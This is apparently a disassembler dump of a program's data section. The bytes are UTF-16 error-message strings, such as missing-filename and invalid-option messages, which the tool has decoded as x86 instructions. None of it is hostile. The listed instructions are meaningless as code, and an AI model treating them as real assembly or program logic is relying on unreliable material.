  439989:	add    BYTE PTR [eax+0x0],dh
  43998c:	je     0x43998e
  43998e:	imul   eax,DWORD PTR [eax],0x6e006f
  439994:	and    BYTE PTR [eax],al
  439996:	jb     0x439998
  439998:	add    BYTE PTR gs:[ecx+0x0],dh
  43999c:	jne    0x43999e
  43999e:	imul   eax,DWORD PTR [eax],0x650072
  4399a4:	jae    0x4399a6
  4399a6:	and    BYTE PTR [eax],al
  4399a8:	popa   
  4399a9:	add    BYTE PTR [eax],ah
  4399ab:	add    BYTE PTR [esi+0x0],ah
  4399ae:	imul   eax,DWORD PTR [eax],0x65006c
  4399b4:	outs   dx,BYTE PTR ds:[esi]
  4399b5:	add    BYTE PTR [ecx+0x0],ah
  4399b8:	ins    DWORD PTR es:[edi],dx
  4399b9:	add    BYTE PTR [ebp+0x0],ah
  4399bc:	add    BYTE PTR [eax],al
  4399be:	and    BYTE PTR [eax],al
  4399c0:	ins    DWORD PTR es:[edi],dx
  4399c1:	add    BYTE PTR [ecx+0x0],ch
  4399c4:	jae    0x4399c6
  4399c6:	jae    0x4399c8
  4399c8:	imul   eax,DWORD PTR [eax],0x67006e
  4399ce:	and    BYTE PTR [eax],al
  4399d0:	data16 add BYTE PTR [ecx+0x0],ch
  4399d4:	ins    BYTE PTR es:[edi],dx
  4399d5:	add    BYTE PTR [ebp+0x0],ah
  4399d8:	outs   dx,BYTE PTR ds:[esi]
  4399d9:	add    BYTE PTR [ecx+0x0],ah
  4399dc:	ins    DWORD PTR es:[edi],dx
  4399dd:	add    BYTE PTR [ebp+0x0],ah
  4399e0:	and    BYTE PTR [eax],al
  4399e2:	ja     0x4399e4
  4399e4:	imul   eax,DWORD PTR [eax],0x680074
  4399ea:	and    BYTE PTR [eax],al
  4399ec:	das    
  4399ed:	add    BYTE PTR [eax+0x0],bl
  4399f0:	and    BYTE PTR [eax],al
  4399f2:	outs   dx,DWORD PTR ds:[esi]
  4399f3:	add    BYTE PTR [eax+0x0],dh
  4399f6:	je     0x4399f8
  4399f8:	imul   eax,DWORD PTR [eax],0x6e006f
  4399fe:	add    BYTE PTR [eax],al
  439a00:	push   ds
  439a01:	add    BYTE PTR [ebp+0x0],ch
  439a04:	imul   eax,DWORD PTR [eax],0x730073
  439a0a:	imul   eax,DWORD PTR [eax],0x67006e
  439a10:	and    BYTE PTR [eax],al
  439a12:	ins    DWORD PTR es:[edi],dx
  439a13:	add    BYTE PTR [ecx+0x0],ah
  439a16:	arpl   WORD PTR [eax],ax
  439a18:	jb     0x439a1a
  439a1a:	outs   dx,DWORD PTR ds:[esi]
  439a1b:	add    BYTE PTR [eax],ah
  439a1d:	add    BYTE PTR [esi+0x0],ch
  439a20:	popa   
  439a21:	add    BYTE PTR [ebp+0x0],ch
  439a24:	add    BYTE PTR gs:[eax],ah
  439a27:	add    BYTE PTR [edx+0x0],ah
  439a2a:	add    BYTE PTR gs:[esi+0x0],ah
  439a2e:	outs   dx,DWORD PTR ds:[esi]
  439a2f:	add    BYTE PTR [edx+0x0],dh
  439a32:	add    BYTE PTR gs:[eax],ah
  439a35:	add    BYTE PTR [edi],ah
  439a37:	add    BYTE PTR ds:0x2700,bh
  439a3d:	add    BYTE PTR [ebx],ch
  439a3f:	add    BYTE PTR [ebp+0x0],cl
  439a42:	inc    ecx
  439a43:	add    BYTE PTR [ebx+0x0],cl
  439a46:	inc    ebp
  439a47:	add    BYTE PTR [esi+0x0],al
  439a4a:	dec    ecx
  439a4b:	add    BYTE PTR [eax+eax*1+0x45],cl
  439a4f:	add    BYTE PTR [eax],ah
  439a51:	add    BYTE PTR [esi+0x0],ch
  439a54:	outs   dx,DWORD PTR ds:[esi]
  439a55:	add    BYTE PTR [eax+eax*1+0x20],dh
  439a59:	add    BYTE PTR [esi+0x0],ah
  439a5c:	outs   dx,DWORD PTR ds:[esi]
  439a5d:	add    BYTE PTR [ebp+0x0],dh
  439a60:	outs   dx,BYTE PTR ds:[esi]
  439a61:	add    BYTE PTR [eax+eax*1+0x20],ah
  439a65:	add    BYTE PTR [ecx+0x0],ah
  439a68:	outs   dx,BYTE PTR ds:[esi]
  439a69:	add    BYTE PTR [eax+eax*1+0x20],ah
  439a6d:	add    BYTE PTR [esi+0x0],ch
  439a70:	outs   dx,DWORD PTR ds:[esi]
  439a71:	add    BYTE PTR [eax],ah
  439a73:	add    BYTE PTR [eax+eax*1+0x61],dh
  439a77:	add    BYTE PTR [edx+0x0],dh
  439a7a:	add    BYTE PTR [di+0x0],ah
  439a7e:	je     0x439a80
  439a80:	and    BYTE PTR [eax],al
  439a82:	jae    0x439a84
  439a84:	jo     0x439a86
  439a86:	add    BYTE PTR gs:[ebx+0x0],ah
  439a8a:	imul   eax,DWORD PTR [eax],0x690066
  439a90:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  439a95:	add    BYTE PTR [eax+eax*1],dl
  439a98:	imul   eax,DWORD PTR [eax],0x76006e
  439a9e:	popa   
  439a9f:	add    BYTE PTR [eax+eax*1+0x69],ch
  439aa3:	add    BYTE PTR [eax+eax*1+0x20],ah
  439aa7:	add    BYTE PTR [edi+0x0],ch
  439aaa:	jo     0x439aac
  439aac:	je     0x439aae
  439aae:	imul   eax,DWORD PTR [eax],0x6e006f
  439ab4:	and    BYTE PTR [eax],al
  439ab6:	daa    
  439ab7:	add    BYTE PTR ds:0x27006300,ah
	...
  439ac5:	add    BYTE PTR [ecx],ah
  439ac7:	add    BYTE PTR [esi+0x0],ch
  439aca:	outs   dx,DWORD PTR ds:[esi]
  439acb:	add    BYTE PTR [eax],ah
  439acd:	add    BYTE PTR [ebp+0x0],ch
  439ad0:	popa   
  439ad1:	add    BYTE PTR [eax+eax*1+0x63],dh
  439ad5:	add    BYTE PTR [eax+0x0],ch
  439ad8:	and    BYTE PTR [eax],al
  439ada:	data16 add BYTE PTR [edi+0x0],ch
  439ade:	jne    0x439ae0
  439ae0:	outs   dx,BYTE PTR ds:[esi]
  439ae1:	add    BYTE PTR [eax+eax*1+0x20],ah
  439ae5:	add    BYTE PTR [esi+0x0],ah
  439ae8:	outs   dx,DWORD PTR ds:[esi]
  439ae9:	add    BYTE PTR [edx+0x0],dh
  439aec:	and    BYTE PTR [eax],al
  439aee:	ja     0x439af0
  439af0:	imul   eax,DWORD PTR [eax],0x64006c
  439af6:	arpl   WORD PTR [eax],ax
  439af8:	popa   
  439af9:	add    BYTE PTR [edx+0x0],dh
  439afc:	add    BYTE PTR fs:[eax],ah
  439aff:	add    BYTE PTR [edi],ah
  439b01:	add    BYTE PTR ds:0x27007300,ah
  439b07:	add    BYTE PTR [eax],al
  439b09:	add    BYTE PTR [edi],bl
  439b0b:	add    BYTE PTR [ebx+0x0],ah
  439b0e:	jns    0x439b10
  439b10:	arpl   WORD PTR [eax],ax
  439b12:	ins    BYTE PTR es:[edi],dx
  439b13:	add    BYTE PTR [ebp+0x0],ah
  439b16:	and    BYTE PTR [eax],al
  439b18:	imul   eax,DWORD PTR [eax],0x20006e
  439b1e:	ins    DWORD PTR es:[edi],dx
  439b1f:	add    BYTE PTR [ecx+0x0],ah
  439b22:	arpl   WORD PTR [eax],ax
  439b24:	jb     0x439b26
  439b26:	outs   dx,DWORD PTR ds:[esi]
  439b27:	add    BYTE PTR [eax],ah
  439b29:	add    BYTE PTR [eax+eax*1+0x65],ah
  439b2d:	add    BYTE PTR [esi+0x0],ah
  439b30:	imul   eax,DWORD PTR [eax],0x69006e
  439b36:	je     0x439b38
  439b38:	imul   eax,DWORD PTR [eax],0x6e006f
  439b3e:	and    BYTE PTR [eax],al
  439b40:	daa    
  439b41:	add    BYTE PTR ds:0x27007300,ah
  439b47:	add    BYTE PTR [eax],al
  439b49:	add    BYTE PTR [ecx],ch
  439b4b:	add    BYTE PTR [ebx+0x0],ah
  439b4e:	jns    0x439b50
  439b50:	arpl   WORD PTR [eax],ax
  439b52:	ins    BYTE PTR es:[edi],dx
  439b53:	add    BYTE PTR [ebp+0x0],ah
  439b56:	and    BYTE PTR [eax],al
  439b58:	imul   eax,DWORD PTR [eax],0x20006e
  439b5e:	add    BYTE PTR fs:[ebp+0x0],ah
  439b62:	jo     0x439b64
  439b64:	add    BYTE PTR gs:[esi+0x0],ch
  439b68:	add    BYTE PTR fs:[ebp+0x0],ah
  439b6c:	outs   dx,BYTE PTR ds:[esi]
  439b6d:	add    BYTE PTR [ebx+0x0],ah
  439b70:	jns    0x439b72
  439b72:	and    BYTE PTR [eax],al
  439b74:	je     0x439b76
  439b76:	jb     0x439b78
  439b78:	add    BYTE PTR gs:[ebp+0x0],ah
  439b7c:	and    BYTE PTR [eax],al
  439b7e:	data16 add BYTE PTR [edi+0x0],ch
  439b82:	jb     0x439b84
  439b84:	and    BYTE PTR [eax],al
  439b86:	je     0x439b88
  439b88:	popa   
  439b89:	add    BYTE PTR [edx+0x0],dh
  439b8c:	add    BYTE PTR [di+0x0],ah
  439b90:	je     0x439b92
  439b92:	and    BYTE PTR [eax],al
  439b94:	daa    
  439b95:	add    BYTE PTR ds:0x27007300,ah
  439b9b:	add    BYTE PTR [eax],al
  439b9d:	add    BYTE PTR [eax+0x41],dl
  439ba0:	push   ds
  439ba1:	add    BYTE PTR [ebx+0x0],ah
  439ba4:	jns    0x439ba6
  439ba6:	arpl   WORD PTR [eax],ax
  439ba8:	ins    BYTE PTR es:[edi],dx
  439ba9:	add    BYTE PTR [ebp+0x0],ah
  439bac:	and    BYTE PTR [eax],al
  439bae:	imul   eax,DWORD PTR [eax],0x20006e
  439bb4:	imul   eax,DWORD PTR [eax],0x63006e
  439bba:	ins    BYTE PTR es:[edi],dx
  439bbb:	add    BYTE PTR [ebp+0x0],dh
  439bbe:	add    BYTE PTR fs:[ebp+0x0],ah
  439bc2:	and    BYTE PTR [eax],al
  439bc4:	data16 add BYTE PTR [ecx+0x0],ch
  439bc8:	ins    BYTE PTR es:[edi],dx
  439bc9:	add    BYTE PTR [ebp+0x0],ah
  439bcc:	jae    0x439bce
  439bce:	and    BYTE PTR [eax],al
  439bd0:	cmp    al,BYTE PTR [eax]
  439bd2:	and    BYTE PTR [eax],al
  439bd4:	daa    
  439bd5:	add    BYTE PTR ds:0x27007300,ah
  439bdb:	add    BYTE PTR [eax],al
  439bdd:	add    BYTE PTR [eax+eax*1],bl
  439be0:	add    BYTE PTR fs:[edi+0x0],ch
  439be4:	outs   dx,BYTE PTR ds:[esi]
  439be5:	add    BYTE PTR [edi],ah
  439be7:	add    BYTE PTR [eax+eax*1+0x20],dh
  439beb:	add    BYTE PTR [ebx+0x0],ch
  439bee:	outs   dx,BYTE PTR ds:[esi]
  439bef:	add    BYTE PTR [edi+0x0],ch
  439bf2:	ja     0x439bf4
  439bf4:	and    BYTE PTR [eax],al
  439bf6:	push   0x77006f00
  439bfb:	add    BYTE PTR [eax],ah
  439bfd:	add    BYTE PTR [eax+eax*1+0x6f],dh
  439c01:	add    BYTE PTR [eax],ah
  439c03:	add    BYTE PTR [ebp+0x0],ch
  439c06:	popa   
  439c07:	add    BYTE PTR [ebx+0x0],ch
  439c0a:	add    BYTE PTR gs:[eax],ah
  439c0d:	add    BYTE PTR [edi],ah
  439c0f:	add    BYTE PTR ds:0x27007300,ah
  439c15:	add    BYTE PTR [eax],al
  439c17:	add    BYTE PTR [eax],al
  439c19:	add    BYTE PTR [eax],al
  439c1b:	add    BYTE PTR [esi],cl
  439c1d:	add    BYTE PTR [esi+0x0],ch
  439c20:	popa   
  439c21:	add    BYTE PTR [ebp+0x0],ch
  439c24:	add    BYTE PTR gs:[eax],ah
  439c27:	add    BYTE PTR [eax+eax*1+0x6f],dh
  439c2b:	add    BYTE PTR [edi+0x0],ch
  439c2e:	and    BYTE PTR [eax],al
  439c30:	ins    BYTE PTR es:[edi],dx
  439c31:	add    BYTE PTR [edi+0x0],ch
  439c34:	outs   dx,BYTE PTR ds:[esi]
  439c35:	add    BYTE PTR [edi+0x0],ah
  439c38:	add    BYTE PTR [eax],al
  439c3a:	sbb    al,BYTE PTR [eax]
  439c3c:	daa    
  439c3d:	add    BYTE PTR ds:0x27007300,ah
  439c43:	add    BYTE PTR [eax],ah
  439c45:	add    BYTE PTR [edx],bh
  439c47:	add    BYTE PTR [eax],ah
  439c49:	add    BYTE PTR [edx+0x0],dh
  439c4c:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  439c51:	add    BYTE PTR [edx+0x0],dh
  439c54:	outs   dx,BYTE PTR ds:[esi]
  439c55:	add    BYTE PTR [eax],ah
  439c57:	add    BYTE PTR [ebx+0x0],ah
  439c5a:	outs   dx,DWORD PTR ds:[esi]
  439c5b:	add    BYTE PTR [eax+eax*1+0x65],ah
  439c5f:	add    BYTE PTR [eax],ah
  439c61:	add    BYTE PTR [edi],ah
  439c63:	add    BYTE PTR [eax],dh
  439c65:	add    BYTE PTR [eax+0x0],bh
  439c68:	and    eax,0x27007800
  439c6d:	add    BYTE PTR [eax],al
  439c6f:	add    BYTE PTR [edx],bl
  439c71:	add    BYTE PTR [ebx+0x0],ah
  439c74:	outs   dx,DWORD PTR ds:[esi]
  439c75:	add    BYTE PTR [esi+0x0],ch
  439c78:	jae    0x439c7a
  439c7a:	je     0x439c7c
  439c7c:	popa   
  439c7d:	add    BYTE PTR [esi+0x0],ch
  439c80:	je     0x439c82
  439c82:	and    BYTE PTR [eax],al
  439c84:	outs   dx,DWORD PTR ds:[esi]
  439c85:	add    BYTE PTR [esi+0x0],dh
  439c88:	add    BYTE PTR gs:[edx+0x0],dh
  439c8c:	data16 add BYTE PTR [eax+eax*1+0x6f],ch
  439c91:	add    BYTE PTR [edi+0x0],dh
  439c94:	and    BYTE PTR [eax],al
  439c96:	popa   
  439c97:	add    BYTE PTR [eax+eax*1+0x20],dh
  439c9b:	add    BYTE PTR [edi],ah
  439c9d:	add    BYTE PTR ds:0x27007300,ah
  439ca3:	add    BYTE PTR [eax],al
  439ca5:	add    BYTE PTR [eax+eax*1],ah
  439ca8:	imul   eax,DWORD PTR [eax],0x6c006c
  439cae:	add    BYTE PTR gs:[edi+0x0],ah
  439cb2:	popa   
  439cb3:	add    BYTE PTR [eax+eax*1+0x20],ch
  439cb7:	add    BYTE PTR [ebp+0x0],ah
  439cba:	js     0x439cbc
  439cbc:	jo     0x439cbe
  439cbe:	jb     0x439cc0
  439cc0:	add    BYTE PTR gs:[ebx+0x0],dh
  439cc4:	jae    0x439cc6
  439cc6:	imul   eax,DWORD PTR [eax],0x6e006f
  439ccc:	and    BYTE PTR [eax],al
  439cce:	cmp    al,BYTE PTR [eax]
  439cd0:	and    BYTE PTR [eax],al
  439cd2:	add    BYTE PTR fs:[ecx+0x0],ch
  439cd6:	jbe    0x439cd8
  439cd8:	imul   eax,DWORD PTR [eax],0x650064
  439cde:	and    BYTE PTR [eax],al
  439ce0:	bound  eax,QWORD PTR [eax]
  439ce2:	jns    0x439ce4
  439ce4:	and    BYTE PTR [eax],al
  439ce6:	jp     0x439ce8
  439ce8:	add    BYTE PTR gs:[edx+0x0],dh
  439cec:	outs   dx,DWORD PTR ds:[esi]
  439ced:	add    BYTE PTR [eax],al
  439cef:	add    BYTE PTR [esi],ah
  439cf1:	add    BYTE PTR [edi+0x0],ch
  439cf4:	jo     0x439cf6
  439cf6:	add    BYTE PTR gs:[edx+0x0],dh
  439cfa:	popa   
  439cfb:	add    BYTE PTR [eax+eax*1+0x6f],dh
  439cff:	add    BYTE PTR [edx+0x0],dh
  439d02:	and    BYTE PTR [eax],al
  439d04:	popa   
  439d05:	add    BYTE PTR [esi+0x0],ch
  439d08:	add    BYTE PTR fs:[edi],ch
  439d0b:	add    BYTE PTR [edi+0x0],ch
  439d0e:	jb     0x439d10
  439d10:	and    BYTE PTR [eax],al
  439d12:	outs   dx,DWORD PTR ds:[esi]
  439d13:	add    BYTE PTR [eax+0x0],dh
  439d16:	add    BYTE PTR gs:[edx+0x0],dh
  439d1a:	popa   
  439d1b:	add    BYTE PTR [esi+0x0],ch
  439d1e:	add    BYTE PTR fs:[eax],ah
  439d21:	add    BYTE PTR [ebp+0x0],dh
  439d24:	jae    0x439d26
  439d26:	popa   
  439d27:	add    BYTE PTR [edi+0x0],ah
  439d2a:	add    BYTE PTR gs:[eax],ah
  439d2d:	add    BYTE PTR [ecx+0x0],ch
  439d30:	ins    BYTE PTR es:[edi],dx
  439d31:	add    BYTE PTR [eax+eax*1+0x65],ch
  439d35:	add    BYTE PTR [edi+0x0],ah
  439d38:	popa   
  439d39:	add    BYTE PTR [eax+eax*1+0x0],ch
  439d3d:	add    BYTE PTR [ecx],bl
  439d3f:	add    BYTE PTR [edi],ah
  439d41:	add    BYTE PTR ds:0x27007300,ah
  439d47:	add    BYTE PTR [eax],ah
  439d49:	add    BYTE PTR [edx],bh
  439d4b:	add    BYTE PTR [eax],ah
  439d4d:	add    BYTE PTR [eax+0x0],dh
  439d50:	jb     0x439d52
  439d52:	outs   dx,DWORD PTR ds:[esi]
  439d53:	add    BYTE PTR [edi+0x0],ah
  439d56:	jb     0x439d58
  439d58:	popa   
  439d59:	add    BYTE PTR [ebp+0x0],ch
  439d5c:	and    BYTE PTR [eax],al
  439d5e:	outs   dx,BYTE PTR ds:[esi]
  439d5f:	add    BYTE PTR [edi+0x0],ch
  439d62:	je     0x439d64
  439d64:	and    BYTE PTR [eax],al
  439d66:	data16 add BYTE PTR [edi+0x0],ch
  439d6a:	jne    0x439d6c
  439d6c:	outs   dx,BYTE PTR ds:[esi]
  439d6d:	add    BYTE PTR [eax+eax*1+0x0],ah
  439d71:	add    BYTE PTR ds:0x25002700,ch
  439d77:	add    BYTE PTR [ebx+0x0],dh
  439d7a:	daa    
  439d7b:	add    BYTE PTR [eax],ah
  439d7d:	add    BYTE PTR [edx],bh
  439d7f:	add    BYTE PTR [eax],ah
  439d81:	add    BYTE PTR [ebx+0x0],ah
  439d84:	popa   
  439d85:	add    BYTE PTR [esi+0x0],ch
  439d88:	outs   dx,BYTE PTR ds:[esi]
  439d89:	add    BYTE PTR [edi+0x0],ch
  439d8c:	je     0x439d8e
  439d8e:	and    BYTE PTR [eax],al
  439d90:	add    BYTE PTR gs:[eax+0x0],bh
  439d94:	add    BYTE PTR gs:[ebx+0x0],ah
  439d98:	jne    0x439d9a
  439d9a:	je     0x439d9c
  439d9c:	add    BYTE PTR gs:[eax],ah
  439d9f:	add    BYTE PTR [ebx+0x0],ah
  439da2:	outs   dx,DWORD PTR ds:[esi]
  439da3:	add    BYTE PTR [ebp+0x0],ch
  439da6:	ins    DWORD PTR es:[edi],dx
  439da7:	add    BYTE PTR [ecx+0x0],ah
  439daa:	outs   dx,BYTE PTR ds:[esi]
  439dab:	add    BYTE PTR [eax+eax*1+0x3b],ah
  439daf:	add    BYTE PTR [eax],ah
  439db1:	add    BYTE PTR [edi+0x0],ch
  439db4:	jne    0x439db6
  439db6:	je     0x439db8
  439db8:	and    BYTE PTR [eax],al
  439dba:	outs   dx,DWORD PTR ds:[esi]
  439dbb:	add    BYTE PTR [esi+0x0],ah
  439dbe:	and    BYTE PTR [eax],al
  439dc0:	ins    DWORD PTR es:[edi],dx
  439dc1:	add    BYTE PTR [ebp+0x0],ah
  439dc4:	ins    DWORD PTR es:[edi],dx
  439dc5:	add    BYTE PTR [edi+0x0],ch
  439dc8:	jb     0x439dca
  439dca:	jns    0x439dcc
  439dcc:	add    BYTE PTR [eax],al
  439dce:	and    eax,0x61007400
  439dd3:	add    BYTE PTR [edx+0x0],dh
  439dd6:	add    BYTE PTR [di+0x0],ah
  439dda:	je     0x439ddc
  439ddc:	and    BYTE PTR [eax],al
  439dde:	ins    DWORD PTR es:[edi],dx
  439ddf:	add    BYTE PTR [ecx+0x0],ah
  439de2:	arpl   WORD PTR [eax],ax
  439de4:	jb     0x439de6
  439de6:	outs   dx,DWORD PTR ds:[esi]
  439de7:	add    BYTE PTR [eax],ah
  439de9:	add    BYTE PTR [edi],ah
  439deb:	add    BYTE PTR ds:0x27007300,ah
  439df1:	add    BYTE PTR [eax],ah
  439df3:	add    BYTE PTR [ebp+0x0],ah
  439df6:	js     0x439df8
  439df8:	jo     0x439dfa
  439dfa:	popa   
  439dfb:	add    BYTE PTR [esi+0x0],ch
  439dfe:	add    BYTE PTR fs:[ebx+0x0],dh
  439e02:	and    BYTE PTR [eax],al
  439e04:	je     0x439e06
  439e06:	outs   dx,DWORD PTR ds:[esi]
  439e07:	add    BYTE PTR [eax],ah
  439e09:	add    BYTE PTR [esi+0x0],ch
  439e0c:	outs   dx,DWORD PTR ds:[esi]
  439e0d:	add    BYTE PTR [eax+eax*1+0x68],dh
  439e11:	add    BYTE PTR [ecx+0x0],ch
  439e14:	outs   dx,BYTE PTR ds:[esi]
  439e15:	add    BYTE PTR [edi+0x0],ah
  439e18:	add    BYTE PTR [eax],al
  439e1a:	and    al,BYTE PTR [eax]
  439e1c:	arpl   WORD PTR [eax],ax
  439e1e:	popa   
  439e1f:	add    BYTE PTR [esi+0x0],ch
  439e22:	outs   dx,BYTE PTR ds:[esi]
  439e23:	add    BYTE PTR [edi+0x0],ch
  439e26:	je     0x439e28
  439e28:	and    BYTE PTR [eax],al
  439e2a:	arpl   WORD PTR [eax],ax
  439e2c:	jb     0x439e2e
  439e2e:	add    BYTE PTR gs:[ecx+0x0],ah
  439e32:	je     0x439e34
  439e34:	add    BYTE PTR gs:[eax],ah
  439e37:	add    BYTE PTR [eax+eax*1+0x65],dh
  439e3b:	add    BYTE PTR [ebp+0x0],ch
  439e3e:	jo     0x439e40
  439e40:	outs   dx,DWORD PTR ds:[esi]
  439e41:	add    BYTE PTR [edx+0x0],dh
  439e44:	popa   
  439e45:	add    BYTE PTR [edx+0x0],dh
  439e48:	jns    0x439e4a
  439e4a:	and    BYTE PTR [eax],al
  439e4c:	data16 add BYTE PTR [ecx+0x0],ch
  439e50:	ins    BYTE PTR es:[edi],dx
  439e51:	add    BYTE PTR [ebp+0x0],ah
  439e54:	and    BYTE PTR [eax],al
  439e56:	daa    
  439e57:	add    BYTE PTR ds:0x27007300,ah
  439e5d:	add    BYTE PTR [eax],al
  439e5f:	add    BYTE PTR [edi],ah
  439e61:	add    BYTE PTR [ebx+0x0],ah
  439e64:	popa   
  439e65:	add    BYTE PTR [esi+0x0],ch
  439e68:	outs   dx,BYTE PTR ds:[esi]
  439e69:	add    BYTE PTR [edi+0x0],ch
  439e6c:	je     0x439e6e
  439e6e:	and    BYTE PTR [eax],al
  439e70:	ins    DWORD PTR es:[edi],dx
  439e71:	add    BYTE PTR [ecx+0x0],ch
  439e74:	js     0x439e76
  439e76:	and    BYTE PTR [eax],al
  439e78:	imul   eax,DWORD PTR [eax],0x70006d
  439e7e:	ins    BYTE PTR es:[edi],dx
  439e7f:	add    BYTE PTR [ecx+0x0],ch
  439e82:	arpl   WORD PTR [eax],ax
  439e84:	imul   eax,DWORD PTR [eax],0x200074
  439e8a:	popa   
  439e8b:	add    BYTE PTR [esi+0x0],ch
  439e8e:	add    BYTE PTR fs:[eax],ah
  439e91:	add    BYTE PTR [ebp+0x0],ah
  439e94:	js     0x439e96
  439e96:	jo     0x439e98
  439e98:	ins    BYTE PTR es:[edi],dx
  439e99:	add    BYTE PTR [ecx+0x0],ch
  439e9c:	arpl   WORD PTR [eax],ax
  439e9e:	imul   eax,DWORD PTR [eax],0x200074
  439ea4:	jb     0x439ea6
  439ea6:	jne    0x439ea8
  439ea8:	ins    BYTE PTR es:[edi],dx
  439ea9:	add    BYTE PTR [ebp+0x0],ah
  439eac:	jae    0x439eae
  439eae:	add    BYTE PTR [eax],al
  439eb0:	add    BYTE PTR es:[ecx+0x0],ch
  439eb4:	outs   dx,BYTE PTR ds:[esi]
  439eb5:	add    BYTE PTR [esi+0x0],ah
  439eb8:	add    BYTE PTR gs:[edx+0x0],dh
  439ebc:	add    BYTE PTR gs:[esi+0x0],ch
  439ec0:	arpl   WORD PTR [eax],ax
  439ec2:	add    BYTE PTR gs:[eax],ah
  439ec5:	add    BYTE PTR [edx+0x0],dh
  439ec8:	jne    0x439eca
  439eca:	ins    BYTE PTR es:[edi],dx
  439ecb:	add    BYTE PTR [ebp+0x0],ah
  439ece:	and    BYTE PTR [eax],al
  439ed0:	arpl   WORD PTR [eax],ax
  439ed2:	popa   
  439ed3:	add    BYTE PTR [esi+0x0],ch
  439ed6:	outs   dx,BYTE PTR ds:[esi]
  439ed7:	add    BYTE PTR [edi+0x0],ch
  439eda:	je     0x439edc
  439edc:	and    BYTE PTR [eax],al
  439ede:	push   0x76006100
  439ee3:	add    BYTE PTR [ebp+0x0],ah
  439ee6:	and    BYTE PTR [eax],al
  439ee8:	add    BYTE PTR fs:[ebp+0x0],ah
  439eec:	jo     0x439eee
  439eee:	add    BYTE PTR gs:[esi+0x0],ch
  439ef2:	add    BYTE PTR fs:[ebp+0x0],ah
  439ef6:	outs   dx,BYTE PTR ds:[esi]
  439ef7:	add    BYTE PTR [eax+eax*1+0x73],dh
  439efb:	add    BYTE PTR [eax],al
  439efd:	add    BYTE PTR [eax],dh
  439eff:	add    BYTE PTR [ebx+0x0],ah
  439f02:	popa   
  439f03:	add    BYTE PTR [esi+0x0],ch
  439f06:	outs   dx,BYTE PTR ds:[esi]
  439f07:	add    BYTE PTR [edi+0x0],ch
  439f0a:	je     0x439f0c
  439f0c:	and    BYTE PTR [eax],al
  439f0e:	push   0x76006100
  439f13:	add    BYTE PTR [ebp+0x0],ah
  439f16:	and    BYTE PTR [eax],al
  439f18:	cmp    al,BYTE PTR [eax]
  439f1a:	and    BYTE PTR [eax],al
  439f1c:	popa   
  439f1d:	add    BYTE PTR [esi+0x0],ch
  439f20:	add    BYTE PTR fs:[eax],ah
  439f23:	add    BYTE PTR [edx],bh
  439f25:	add    BYTE PTR [edx],bh
  439f27:	add    BYTE PTR [eax],ah
  439f29:	add    BYTE PTR [eax+eax*1+0x65],ah
  439f2d:	add    BYTE PTR [eax+0x0],dh
  439f30:	add    BYTE PTR gs:[esi+0x0],ch
  439f34:	add    BYTE PTR fs:[ebp+0x0],ah
  439f38:	outs   dx,BYTE PTR ds:[esi]
  439f39:	add    BYTE PTR [eax+eax*1+0x73],dh
  439f3d:	add    BYTE PTR [eax],ah
  439f3f:	add    BYTE PTR [esi+0x0],ah
  439f42:	outs   dx,DWORD PTR ds:[esi]
  439f43:	add    BYTE PTR [edx+0x0],dh
  439f46:	and    BYTE PTR [eax],al
  439f48:	jae    0x439f4a
  439f4a:	popa   
  439f4b:	add    BYTE PTR [ebp+0x0],ch
  439f4e:	add    BYTE PTR gs:[eax],ah
  439f51:	add    BYTE PTR [eax+eax*1+0x61],dh
  439f55:	add    BYTE PTR [edx+0x0],dh
  439f58:	add    BYTE PTR [di+0x0],ah
  439f5c:	je     0x439f5e
  439f5e:	add    BYTE PTR [eax],al
  439f60:	sub    DWORD PTR [eax],eax
  439f62:	imul   eax,DWORD PTR [eax],0x76006e
  439f68:	popa   
  439f69:	add    BYTE PTR [eax+eax*1+0x69],ch
  439f6d:	add    BYTE PTR [eax+eax*1+0x20],ah
  439f71:	add    BYTE PTR [ebx+0x0],dh
  439f74:	add    BYTE PTR gs:[eax+0x0],dh
  439f78:	popa   
  439f79:	add    BYTE PTR [edx+0x0],dh
  439f7c:	popa   
  439f7d:	add    BYTE PTR [eax+eax*1+0x6f],dh
  439f81:	add    BYTE PTR [edx+0x0],dh
  439f84:	and    BYTE PTR [eax],al
  439f86:	daa    
  439f87:	add    BYTE PTR [edx],bh
  439f89:	add    BYTE PTR [edx],bh
  439f8b:	add    BYTE PTR [edi],ah
  439f8d:	add    BYTE PTR [eax],ah
  439f8f:	add    BYTE PTR [edi+0x0],ch
  439f92:	outs   dx,BYTE PTR ds:[esi]
  439f93:	add    BYTE PTR [eax],ah
  439f95:	add    BYTE PTR [ecx+0x0],ch
  439f98:	outs   dx,BYTE PTR ds:[esi]
  439f99:	add    BYTE PTR [esi+0x0],ah
  439f9c:	add    BYTE PTR gs:[edx+0x0],dh
  439fa0:	add    BYTE PTR gs:[esi+0x0],ch
  439fa4:	arpl   WORD PTR [eax],ax
  439fa6:	add    BYTE PTR gs:[eax],ah
  439fa9:	add    BYTE PTR [edx+0x0],dh
  439fac:	jne    0x439fae
  439fae:	ins    BYTE PTR es:[edi],dx
  439faf:	add    BYTE PTR [ebp+0x0],ah
  439fb2:	add    BYTE PTR [eax],al
  439fb4:	add    BYTE PTR cs:[ebx+0x0],ah
  439fb8:	popa   
  439fb9:	add    BYTE PTR [esi+0x0],ch
  439fbc:	outs   dx,BYTE PTR ds:[esi]
  439fbd:	add    BYTE PTR [edi+0x0],ch
  439fc0:	je     0x439fc2
  439fc2:	and    BYTE PTR [eax],al
  439fc4:	push   0x76006100
  439fc9:	add    BYTE PTR [ebp+0x0],ah
  439fcc:	and    BYTE PTR [eax],al
  439fce:	bound  eax,QWORD PTR [eax]
  439fd0:	jne    0x439fd2
  439fd2:	imul   eax,DWORD PTR [eax],0x64006c
  439fd8:	and    BYTE PTR [eax],al
  439fda:	arpl   WORD PTR [eax],ax
  439fdc:	outs   dx,DWORD PTR ds:[esi]
  439fdd:	add    BYTE PTR [ebp+0x0],ch
  439fe0:	ins    DWORD PTR es:[edi],dx
  439fe1:	add    BYTE PTR [ecx+0x0],ah
  439fe4:	outs   dx,BYTE PTR ds:[esi]
  439fe5:	add    BYTE PTR [eax+eax*1+0x73],ah
  439fe9:	add    BYTE PTR [eax],ah
  439feb:	add    BYTE PTR [esi+0x0],ah
  439fee:	outs   dx,DWORD PTR ds:[esi]
  439fef:	add    BYTE PTR [edx+0x0],dh
  439ff2:	and    BYTE PTR [eax],al
  439ff4:	add    BYTE PTR fs:[ecx+0x0],ch
  439ff8:	jb     0x439ffa
